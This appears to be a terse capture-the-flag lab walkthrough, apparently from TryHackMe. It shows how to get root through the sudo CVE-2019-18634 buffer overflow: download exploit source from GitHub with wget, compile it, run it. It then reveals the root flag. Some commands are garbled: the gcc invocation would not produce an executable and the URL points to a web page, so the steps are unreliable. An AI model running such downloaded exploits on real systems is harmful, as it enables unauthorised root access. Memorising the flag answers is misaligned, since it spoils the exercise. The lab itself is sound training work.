IP address 10.10.175.132

connected with machine  with ssh and port 4444

then run 
wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c

get the exploitation code for excute 

now run gcc -c <output file> <source-file>  (gcc -c exploit exploit.c)

aftter that run ./exploit

#1 Use the pre-compiled exploit in the VM to get a root shell.
Ans. answer not applied 

#2 What's the flag in /root/root.txt?
Ans. run cat /root/root.txt
 flag THM{buff3r_0v3rfl0w_rul3s}

